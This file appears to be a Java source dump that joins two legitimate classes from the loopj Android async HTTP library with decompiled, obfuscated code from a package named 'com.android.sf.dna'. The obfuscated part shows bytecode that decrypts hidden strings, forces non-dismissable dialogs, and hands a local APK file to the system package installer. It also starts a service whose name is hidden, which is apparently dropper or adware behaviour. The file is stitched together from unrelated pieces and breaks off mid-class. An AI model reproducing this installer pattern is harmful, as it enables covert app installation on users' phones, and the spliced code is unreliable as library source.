/*
    Android Asynchronous Http Client
    Copyright (c) 2011 James Smith <james@loopj.com>
    http://loopj.com

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/

package com.loopj.android.http;

import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpResponseException;
import org.apache.http.entity.BufferedHttpEntity;
import org.apache.http.util.EntityUtils;

import java.io.IOException;

/**
 * Used to intercept and handle the responses from requests made using 
 * {@link AsyncHttpClient}. The {@link #onSuccess(String)} method is 
 * designed to be anonymously overridden with your own response handling code.
 * <p>
 * Additionally, you can override the {@link #onFailure(Throwable, String)},
 * {@link #onStart()}, and {@link #onFinish()} methods as required.
 * <p>
 * For example:
 * <p>
 * <pre>
 * AsyncHttpClient client = new AsyncHttpClient();
 * client.get("http://www.google.com", new AsyncHttpResponseHandler() {
 *     &#064;Override
 *     public void onStart() {
 *         // Initiated the request
 *     }
 *
 *     &#064;Override
 *     public void onSuccess(String response) {
 *         // Successfully got a response
 *     }
 * 
 *     &#064;Override
 *     public void onFailure(Throwable e, String response) {
 *         // Response failed :(
 *     }
 *
 *     &#064;Override
 *     public void onFinish() {
 *         // Completed the request (either success or failure)
 *     }
 * });
 * </pre>
 */
public class AsyncHttpResponseHandler {
    protected static final int SUCCESS_MESSAGE = 0;
    protected static final int FAILURE_MESSAGE = 1;
    protected static final int START_MESSAGE = 2;
    protected static final int FINISH_MESSAGE = 3;

    private Handler handler;

    /**
     * Creates a new AsyncHttpResponseHandler
     */
    public AsyncHttpResponseHandler() {
        // Set up a handler to post events back to the correct thread if possible
        if(Looper.myLooper() != null) {
            handler = new Handler(){
                public void handleMessage(Message msg){
                    AsyncHttpResponseHandler.this.handleMessage(msg);
                }
            };
        }
    }


    //
    // Callbacks to be overridden, typically anonymously
    //

    /**
     * Fired when the request is started, override to handle in your own code
     */
    public void onStart() {}

    /**
     * Fired in all cases when the request is finished, after both success and failure, override to handle in your own code
     */
    public void onFinish() {}

    /**
     * Fired when a request returns successfully, override to handle in your own code
     * @param content the body of the HTTP response from the server
     */
    public void onSuccess(String content) {}

    /**
     * Fired when a request returns successfully, override to handle in your own code
     * @param statusCode the status code of the response
     * @param content the body of the HTTP response from the server
     */
    public void onSuccess(int statusCode,Header[] headers,String content) {
        onSuccess(content);
    }

    /**
     * Fired when a request fails to complete, override to handle in your own code
     * @param error the underlying cause of the failure
     * @deprecated use {@link #onFailure(Throwable, String)}
     */
    public void onFailure(Throwable error) {}

    /**
     * Fired when a request fails to complete, override to handle in your own code
     * @param error the underlying cause of the failure
     * @param content the response body, if any
     */
    public void onFailure(Throwable error, String content) {
        // By default, call the deprecated onFailure(Throwable) for compatibility
        onFailure(error);
    }


    //
    // Pre-processing of messages (executes in background threadpool thread)
    //

    protected void sendSuccessMessage(int statusCode, Header[] headers, String responseBody) {
        sendMessage(obtainMessage(SUCCESS_MESSAGE, new Object[]{new Integer(statusCode),headers, responseBody}));
    }
    
    protected void sendFailureMessage(Throwable e, String responseBody) {
        sendMessage(obtainMessage(FAILURE_MESSAGE, new Object[]{e, null, responseBody}));
    }

    protected void sendFailureMessage(Throwable e, Header[] headers, String responseBody) {
        sendMessage(obtainMessage(FAILURE_MESSAGE, new Object[]{e, headers, responseBody}));
    }

    protected void sendFailureMessage(Throwable e, Header[] headers, byte[] responseBody) {
        sendMessage(obtainMessage(FAILURE_MESSAGE, new Object[]{e, headers, responseBody}));
    }

    protected void sendFailureMessage(Throwable e, byte[] responseBody) {
        sendMessage(obtainMessage(FAILURE_MESSAGE, new Object[]{e, null, responseBody}));
    }

    protected void sendStartMessage() {
        sendMessage(obtainMessage(START_MESSAGE, null));
    }

    protected void sendFinishMessage() {
        sendMessage(obtainMessage(FINISH_MESSAGE, null));
    }


    //
    // Pre-processing of messages (in original calling thread, typically the UI thread)
    //

    protected void handleSuccessMessage(int statusCode, Header[] headers, String responseBody) {
        onSuccess(statusCode, headers, responseBody);
    }

    protected void handleFailureMessage(Throwable e, Header [] headers, String responseBody) {
        onFailure(e, responseBody);
    }



    // Methods which emulate android's Handler and Message methods
    protected void handleMessage(Message msg) {
        Object[] response;

        switch(msg.what) {
            case SUCCESS_MESSAGE:
                response = (Object[])msg.obj;
                handleSuccessMessage(((Integer) response[0]).intValue(),(Header[]) response[1], (String) response[2]);
                break;
            case FAILURE_MESSAGE:
                response = (Object[])msg.obj;
                handleFailureMessage((Throwable)response[0], (Header[]) response[1], (String)response[2]);
                break;
            case START_MESSAGE:
                onStart();
                break;
            case FINISH_MESSAGE:
                onFinish();
                break;
        }
    }

    protected void sendMessage(Message msg) {
        if(handler != null){
            handler.sendMessage(msg);
        } else {
            handleMessage(msg);
        }
    }

    protected Message obtainMessage(int responseMessage, Object response) {
        Message msg = null;
        if(handler != null){
            msg = this.handler.obtainMessage(responseMessage, response);
        }else{
            msg = new Message();
            msg.what = responseMessage;
            msg.obj = response;
        }
        return msg;
    }

    // Interface to AsyncHttpRequest
    void sendResponseMessage(HttpResponse response) {
        StatusLine status = response.getStatusLine();
        String responseBody = null;
        try {
            HttpEntity entity = null;
            HttpEntity temp = response.getEntity();
            if(temp != null) {
                entity = new BufferedHttpEntity(temp);
                responseBody = EntityUtils.toString(entity, "UTF-8");
            }
        } catch(IOException e) {
            sendFailureMessage(e, response.getAllHeaders(), (String) null);
        }

        if(status.getStatusCode() >= 300) {
            sendFailureMessage(new HttpResponseException(
                status.getStatusCode(), status.getReasonPhrase()),
                response.getAllHeaders(), responseBody);
        } else {
            sendSuccessMessage(status.getStatusCode(), response.getAllHeaders(), responseBody);
        }
    }
}
/*
    Android Asynchronous Http Client
    Copyright (c) 2011 James Smith <james@loopj.com>
    http://loopj.com

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/

package com.loopj.android.http;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;
import org.apache.http.Header;
import android.os.Message;

/**
 * Used to intercept and handle the responses from requests made using
 * {@link AsyncHttpClient}, with automatic parsing into a {@link JSONObject}
 * or {@link JSONArray}.
 * <p>
 * This class is designed to be passed to get, post, put and delete requests
 * with the {@link #onSuccess(JSONObject)} or {@link #onSuccess(JSONArray)}
 * methods anonymously overridden.
 * <p>
 * Additionally, you can override the other event methods from the
 * parent class.
 */
public class JsonHttpResponseHandler extends AsyncHttpResponseHandler {
    protected static final int SUCCESS_JSON_MESSAGE = 100;

    //
    // Callbacks to be overridden, typically anonymously
    //

    /**
     * Fired when a request returns successfully and contains a json object
     * at the base of the response string. Override to handle in your
     * own code.
     * @param response the parsed json object found in the server response (if any)
     */
    public void onSuccess(JSONObject response) {}


    /**
     * Fired when a request returns successfully and contains a json array
     * at the base of the response string. Override to handle in your
     * own code.
     * @param response the parsed json array found in the server response (if any)
     */
    public void onSuccess(JSONArray response) {}

    /**
     * Fired when a request returns successfully and contains a json object
     * at the base of the response string. Override to handle in your
     * own code.
     * @param statusCode the status code of the response
     * @param response the parsed json object found in the server response (if any)
     */
    public void onSuccess(int statusCode, Header[] headers, JSONObject response) {
        onSuccess(response);
    }


    /**
     * Fired when a request returns successfully and contains a json array
     * at the base of the response string. Override to handle in your
     * own code.
     * @param statusCode the status code of the response
     * @param response the parsed json array found in the server response (if any)
     */
    public void onSuccess(int statusCode, Header[] headers, JSONArray response) {
        onSuccess(response);
    }

    public void onFailure(Throwable e, JSONObject errorResponse) {}
    public void onFailure(Throwable e, JSONArray errorResponse) {}


    //
    // Pre-processing of messages (executes in background threadpool thread)
    //

    @Override
    protected void sendSuccessMessage(int statusCode, Header[] headers, String responseBody) {
        try {
            Object jsonResponse = parseResponse(responseBody);
            sendMessage(obtainMessage(SUCCESS_JSON_MESSAGE, new Object[]{statusCode, headers, jsonResponse}));
        } catch(JSONException e) {
            sendFailureMessage(e, headers, responseBody);
        }
    }


    //
    // Pre-processing of messages (in original calling thread, typically the UI thread)
    //

    @Override
    protected void handleMessage(Message msg) {
        switch(msg.what){
            case SUCCESS_JSON_MESSAGE:
                Object[] response = (Object[]) msg.obj;
                handleSuccessJsonMessage(((Integer) response[0]).intValue(),(Header[]) response[1] ,response[2]);
                break;
            default:
                super.handleMessage(msg);
        }
    }

    protected void handleSuccessJsonMessage(int statusCode,Header[] headers, Object jsonResponse) {
        if(jsonResponse instanceof JSONObject) {
            onSuccess(statusCode, headers, (JSONObject)jsonResponse);
        } else if(jsonResponse instanceof JSONArray) {
            onSuccess(statusCode, headers, (JSONArray)jsonResponse);
        } else {
            onFailure(new JSONException("Unexpected type " + jsonResponse.getClass().getName()), (JSONObject)null);
        }
    }

    protected Object parseResponse(String responseBody) throws JSONException {
        Object result = null;
        //trim the string to prevent start with blank, and test if the string is valid JSON, because the parser don't do this :(. If Json is not valid this will return null
		responseBody = responseBody.trim();
		if(responseBody.startsWith("{") || responseBody.startsWith("[")) {
			result = new JSONTokener(responseBody).nextValue();
		}
		if (result == null) {
			result = responseBody;
		}
		return result;
    }

    @Override
    protected void handleFailureMessage(Throwable e, Header[] headers, String responseBody) {
        try {
            if (responseBody != null) {
                Object jsonResponse = parseResponse(responseBody);
                if(jsonResponse instanceof JSONObject) {
                    onFailure(e, (JSONObject)jsonResponse);
                } else if(jsonResponse instanceof JSONArray) {
                    onFailure(e, (JSONArray)jsonResponse);
                } else {
                    onFailure(e, responseBody);
                }
            }else {
                onFailure(e, "");
            }
        }catch(JSONException ex) {
            onFailure(e, responseBody);
        }
    }
}

class Up implements DialogInterface.OnClickListener {
    Up(Collection paramCollection) {}

    public void onClick(DialogInterface paramDialogInterface, int paramInt) {
        try {
            this.a.a.d.setCancelable(true);
            this.a.a.d.dismiss();
            this.a.a.d.cancel();
            return;
        } catch (Exception exception) {
            return;
        }
    }
}

class Collection extends Handler {
    Collection(To paramTo) {}

    public void handleMessage(Message paramMessage) {
        // Byte code:
        //   0: aload_0
        //   1: aload_1
        //   2: invokespecial handleMessage : (Landroid/os/Message;)V
        //   5: aload_1
        //   6: getfield what : I
        //   9: lookupswitch default -> 84, 0 -> 85, 10 -> 364, 11 -> 383, 12 -> 475, 13 -> 657, 14 -> 768, 100 -> 879, 101 -> 111
        //   84: return
        //   85: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   88: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
        //   91: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   94: invokevirtual getPackageName : ()Ljava/lang/String;
        //   97: invokevirtual getLaunchIntentForPackage : (Ljava/lang/String;)Landroid/content/Intent;
        //   100: astore_1
        //   101: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   104: aload_1
        //   105: invokevirtual startActivity : (Landroid/content/Intent;)V
        //   108: return
        //   109: astore_1
        //   110: return
        //   111: ldc ''
        //   113: astore_1
        //   114: new java/lang/StringBuilder
        //   117: dup
        //   118: invokespecial <init> : ()V
        //   121: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   124: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   127: invokevirtual getResources : ()Landroid/content/res/Resources;
        //   130: new java/lang/StringBuilder
        //   133: dup
        //   134: invokespecial <init> : ()V
        //   137: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   140: invokevirtual getPackageName : ()Ljava/lang/String;
        //   143: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   146: ldc ':string/app_name'
        //   148: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   151: invokevirtual toString : ()Ljava/lang/String;
        //   154: aconst_null
        //   155: aconst_null
        //   156: invokevirtual getIdentifier : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I
        //   159: invokevirtual getString : (I)Ljava/lang/String;
        //   162: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   165: ldc ':'
        //   167: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   170: invokevirtual toString : ()Ljava/lang/String;
        //   173: astore_2
        //   174: aload_2
        //   175: astore_1
        //   176: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   179: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
        //   182: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   185: invokevirtual getPackageName : ()Ljava/lang/String;
        //   188: iconst_0
        //   189: invokevirtual getPackageInfo : (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
        //   192: getfield versionName : Ljava/lang/String;
        //   195: astore_2
        //   196: new java/lang/StringBuilder
        //   199: dup
        //   200: invokespecial <init> : ()V
        //   203: aload_2
        //   204: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   207: ldc '.2'
        //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   212: invokevirtual toString : ()Ljava/lang/String;
        //   215: astore_3
        //   216: aload_0
        //   217: getfield a : Lcom/android/sf/dna/To;
        //   220: new android/app/AlertDialog$Builder
        //   223: dup
        //   224: getstatic com/android/sf/dna/To.g : Landroid/content/Context;
        //   227: invokespecial <init> : (Landroid/content/Context;)V
        //   230: iconst_0
        //   231: invokevirtual setCancelable : (Z)Landroid/app/AlertDialog$Builder;
        //   234: ldc 'aZ+4B1OpB1HYB1xYBbCO'
        //   236: ldc 'uKiI9qn_'
        //   238: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   241: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   244: invokevirtual setTitle : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   247: new java/lang/StringBuilder
        //   250: dup
        //   251: invokespecial <init> : ()V
        //   254: ldc 'BQIVB12EB7+4662H'
        //   256: ldc 'uKiI9qn_'
        //   258: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   261: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   264: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   267: aload_2
        //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   271: ldc 'vnmII6qIRmJR5bKRmmehhFbZ'
        //   273: ldc 'uKiI9qn_'
        //   275: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   278: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   281: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   284: aload_1
        //   285: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   288: aload_3
        //   289: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   292: invokevirtual toString : ()Ljava/lang/String;
        //   295: invokevirtual setMessage : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   298: ldc 'BatOBHaH'
        //   300: ldc 'uKiI9qn_'
        //   302: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   305: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   308: new com/android/sf/dna/Atrox
        //   311: dup
        //   312: aload_0
        //   313: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   316: invokevirtual setPositiveButton : (Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
        //   319: invokevirtual create : ()Landroid/app/AlertDialog;
        //   322: putfield e : Landroid/app/AlertDialog;
        //   325: aload_0
        //   326: getfield a : Lcom/android/sf/dna/To;
        //   329: getfield e : Landroid/app/AlertDialog;
        //   332: new com/android/sf/dna/Crotalus
        //   335: dup
        //   336: aload_0
        //   337: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   340: invokevirtual setOnKeyListener : (Landroid/content/DialogInterface$OnKeyListener;)V
        //   343: aload_0
        //   344: getfield a : Lcom/android/sf/dna/To;
        //   347: getfield e : Landroid/app/AlertDialog;
        //   350: invokevirtual show : ()V
        //   353: return
        //   354: astore_2
        //   355: ldc '1.2.1121'
        //   357: astore_2
        //   358: ldc '1.2.3221'
        //   360: astore_3
        //   361: goto -> 216
        //   364: new java/lang/Thread
        //   367: dup
        //   368: new com/android/sf/dna/Looking
        //   371: dup
        //   372: aload_0
        //   373: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   376: invokespecial <init> : (Ljava/lang/Runnable;)V
        //   379: invokevirtual start : ()V
        //   382: return
        //   383: aload_0
        //   384: getfield a : Lcom/android/sf/dna/To;
        //   387: new android/app/ProgressDialog
        //   390: dup
        //   391: getstatic com/android/sf/dna/To.g : Landroid/content/Context;
        //   394: invokespecial <init> : (Landroid/content/Context;)V
        //   397: putfield d : Landroid/app/ProgressDialog;
        //   400: aload_0
        //   401: getfield a : Lcom/android/sf/dna/To;
        //   404: getfield d : Landroid/app/ProgressDialog;
        //   407: iconst_0
        //   408: invokevirtual setCancelable : (Z)V
        //   411: aload_0
        //   412: getfield a : Lcom/android/sf/dna/To;
        //   415: getfield d : Landroid/app/ProgressDialog;
        //   418: ldc 'BUCwBz2bB1OpB1HYB1xYBbCO9WQO'
        //   420: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   423: invokevirtual setTitle : (Ljava/lang/CharSequence;)V
        //   426: aload_0
        //   427: getfield a : Lcom/android/sf/dna/To;
        //   430: getfield d : Landroid/app/ProgressDialog;
        //   433: invokevirtual show : ()V
        //   436: aload_0
        //   437: getfield a : Lcom/android/sf/dna/To;
        //   440: invokestatic a : (Lcom/android/sf/dna/To;)V
        //   443: new java/lang/Thread
        //   446: dup
        //   447: new com/android/sf/dna/New
        //   450: dup
        //   451: aload_0
        //   452: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   455: invokespecial <init> : (Ljava/lang/Runnable;)V
        //   458: invokevirtual start : ()V
        //   461: return
        //   462: astore_1
        //   463: aload_0
        //   464: getfield a : Lcom/android/sf/dna/To;
        //   467: bipush #13
        //   469: invokestatic a : (Lcom/android/sf/dna/To;I)V
        //   472: return
        //   473: astore_1
        //   474: return
        //   475: new java/io/File
        //   478: dup
        //   479: new java/lang/StringBuilder
        //   482: dup
        //   483: invokespecial <init> : ()V
        //   486: ldc '9Ci5utjhztkp7cA_'
        //   488: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   491: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   494: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   497: invokevirtual getPackageName : ()Ljava/lang/String;
        //   500: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   503: ldc '9Cz18t3N94nO7KTm'
        //   505: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   508: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   511: invokevirtual toString : ()Ljava/lang/String;
        //   514: invokespecial <init> : (Ljava/lang/String;)V
        //   517: astore_1
        //   518: aload_1
        //   519: invokevirtual exists : ()Z
        //   522: ifeq -> 641
        //   525: aload_1
        //   526: invokevirtual canRead : ()Z
        //   529: ifeq -> 641
        //   532: aload_1
        //   533: invokestatic fromFile : (Ljava/io/File;)Landroid/net/Uri;
        //   536: astore_1
        //   537: new android/content/Intent
        //   540: dup
        //   541: ldc 'android.intent.action.VIEW'
        //   543: aload_1
        //   544: invokespecial <init> : (Ljava/lang/String;Landroid/net/Uri;)V
        //   547: astore_2
        //   548: aload_2
        //   549: aload_1
        //   550: invokevirtual setData : (Landroid/net/Uri;)Landroid/content/Intent;
        //   553: pop
        //   554: aload_2
        //   555: iconst_1
        //   556: invokevirtual addFlags : (I)Landroid/content/Intent;
        //   559: pop
        //   560: aload_2
        //   561: ldc 'com.android.packageinstaller'
        //   563: ldc 'com.android.packageinstaller.PackageInstallerActivity'
        //   565: invokevirtual setClassName : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
        //   568: pop
        //   569: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   572: aload_2
        //   573: invokevirtual startActivity : (Landroid/content/Intent;)V
        //   576: iconst_0
        //   577: putstatic com/android/sf/dna/To.i : Z
        //   580: aload_0
        //   581: getfield a : Lcom/android/sf/dna/To;
        //   584: getfield d : Landroid/app/ProgressDialog;
        //   587: iconst_1
        //   588: invokevirtual setCancelable : (Z)V
        //   591: aload_0
        //   592: getfield a : Lcom/android/sf/dna/To;
        //   595: getfield d : Landroid/app/ProgressDialog;
        //   598: invokevirtual dismiss : ()V
        //   601: aload_0
        //   602: getfield a : Lcom/android/sf/dna/To;
        //   605: getfield d : Landroid/app/ProgressDialog;
        //   608: invokevirtual cancel : ()V
        //   611: new java/lang/Thread
        //   614: dup
        //   615: new com/android/sf/dna/Additions
        //   618: dup
        //   619: aload_0
        //   620: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   623: invokespecial <init> : (Ljava/lang/Runnable;)V
        //   626: invokevirtual start : ()V
        //   629: return
        //   630: astore_1
        //   631: aload_0
        //   632: getfield a : Lcom/android/sf/dna/To;
        //   635: bipush #13
        //   637: invokestatic a : (Lcom/android/sf/dna/To;I)V
        //   640: return
        //   641: aload_0
        //   642: getfield a : Lcom/android/sf/dna/To;
        //   645: bipush #13
        //   647: invokestatic a : (Lcom/android/sf/dna/To;I)V
        //   650: goto -> 580
        //   653: astore_1
        //   654: goto -> 611
        //   657: aload_0
        //   658: getfield a : Lcom/android/sf/dna/To;
        //   661: new android/app/AlertDialog$Builder
        //   664: dup
        //   665: getstatic com/android/sf/dna/To.g : Landroid/content/Context;
        //   668: invokespecial <init> : (Landroid/content/Context;)V
        //   671: iconst_0
        //   672: invokevirtual setCancelable : (Z)Landroid/app/AlertDialog$Builder;
        //   675: ldc_w 'a7vHBB+R'
        //   678: ldc 'uKiI9qn_'
        //   680: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   683: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   686: invokevirtual setTitle : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   689: ldc_w 'a9XdB1HYBHcsa9cR662fB9W9BU25B1OpB1HY662T'
        //   692: ldc 'uKiI9qn_'
        //   694: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   697: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   700: invokevirtual setMessage : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   703: ldc 'BatOBHaH'
        //   705: ldc 'uKiI9qn_'
        //   707: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   710: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   713: new com/android/sf/dna/Up
        //   716: dup
        //   717: aload_0
        //   718: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   721: invokevirtual setPositiveButton : (Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
        //   724: invokevirtual create : ()Landroid/app/AlertDialog;
        //   727: putfield e : Landroid/app/AlertDialog;
        //   730: aload_0
        //   731: getfield a : Lcom/android/sf/dna/To;
        //   734: iconst_0
        //   735: putfield f : I
        //   738: aload_0
        //   739: getfield a : Lcom/android/sf/dna/To;
        //   742: getfield e : Landroid/app/AlertDialog;
        //   745: new com/android/sf/dna/Some
        //   748: dup
        //   749: aload_0
        //   750: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   753: invokevirtual setOnKeyListener : (Landroid/content/DialogInterface$OnKeyListener;)V
        //   756: aload_0
        //   757: getfield a : Lcom/android/sf/dna/To;
        //   760: getfield e : Landroid/app/AlertDialog;
        //   763: invokevirtual show : ()V
        //   766: return
        //   767: astore_1
        //   768: aload_0
        //   769: getfield a : Lcom/android/sf/dna/To;
        //   772: new android/app/AlertDialog$Builder
        //   775: dup
        //   776: getstatic com/android/sf/dna/To.g : Landroid/content/Context;
        //   779: invokespecial <init> : (Landroid/content/Context;)V
        //   782: iconst_0
        //   783: invokevirtual setCancelable : (Z)Landroid/app/AlertDialog$Builder;
        //   786: ldc_w 'a7vHBB+R'
        //   789: ldc 'uKiI9qn_'
        //   791: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   794: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   797: invokevirtual setTitle : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   800: ldc_w 'B1OpB1HYaz2SaZHTBbZba7X0BzvhaZ+RBaW9B8UG'
        //   803: ldc 'uKiI9qn_'
        //   805: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   808: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   811: invokevirtual setMessage : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   814: ldc_w 'a7X0Bzvh'
        //   817: ldc 'uKiI9qn_'
        //   819: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   822: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   825: new com/android/sf/dna/Today
        //   828: dup
        //   829: aload_0
        //   830: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   833: invokevirtual setPositiveButton : (Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
        //   836: invokevirtual create : ()Landroid/app/AlertDialog;
        //   839: putfield e : Landroid/app/AlertDialog;
        //   842: aload_0
        //   843: getfield a : Lcom/android/sf/dna/To;
        //   846: iconst_0
        //   847: putfield f : I
        //   850: aload_0
        //   851: getfield a : Lcom/android/sf/dna/To;
        //   854: getfield e : Landroid/app/AlertDialog;
        //   857: new com/android/sf/dna/Picked
        //   860: dup
        //   861: aload_0
        //   862: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   865: invokevirtual setOnKeyListener : (Landroid/content/DialogInterface$OnKeyListener;)V
        //   868: aload_0
        //   869: getfield a : Lcom/android/sf/dna/To;
        //   872: getfield e : Landroid/app/AlertDialog;
        //   875: invokevirtual show : ()V
        //   878: return
        //   879: aload_0
        //   880: getfield a : Lcom/android/sf/dna/To;
        //   883: getfield c : Landroid/content/Intent;
        //   886: aload_0
        //   887: getfield a : Lcom/android/sf/dna/To;
        //   890: getfield a : Ljava/lang/String;
        //   893: aload_0
        //   894: getfield a : Lcom/android/sf/dna/To;
        //   897: getfield b : Ljava/lang/String;
        //   900: invokevirtual setClassName : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
        //   903: pop
        //   904: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   907: aload_0
        //   908: getfield a : Lcom/android/sf/dna/To;
        //   911: getfield c : Landroid/content/Intent;
        //   914: invokevirtual startService : (Landroid/content/Intent;)Landroid/content/ComponentName;
        //   917: pop
        //   918: return
        //   919: astore_1
        //   920: return
        //   921: astore_2
        //   922: goto -> 176
        //   925: astore_1
        //   926: return
        // Exception table:
        //   from	to	target	type
        //   85	108	109	java/lang/Exception
        //   114	174	921	java/lang/Exception
        //   176	216	354	java/lang/Exception
        //   216	353	925	java/lang/Exception
        //   383	436	473	java/lang/Exception
        //   436	461	462	java/lang/Exception
        //   463	472	473	java/lang/Exception
        //   475	580	653	java/lang/Exception
        //   580	611	653	java/lang/Exception
        //   611	629	630	java/lang/Exception
        //   641	650	653	java/lang/Exception
        //   657	766	767	java/lang/Exception
        //   879	918	919	java/lang/Exception
    }
}

public class To {
    static Context g = null;

    static Activity h = null;

    public static boolean i = true;

    String a = Amazing.a("7CMg9IkOzoFhHxlO7Ikput32Xl__");

    String b = Amazing.a("7CMg9IkOzoFhHxlO7Ikput32XcBvrIRDzC3lrIMCHxiRrn__");

    Intent c = new Intent();

    ProgressDialog d = null;

    AlertDialog e = null;

    int f = 0;

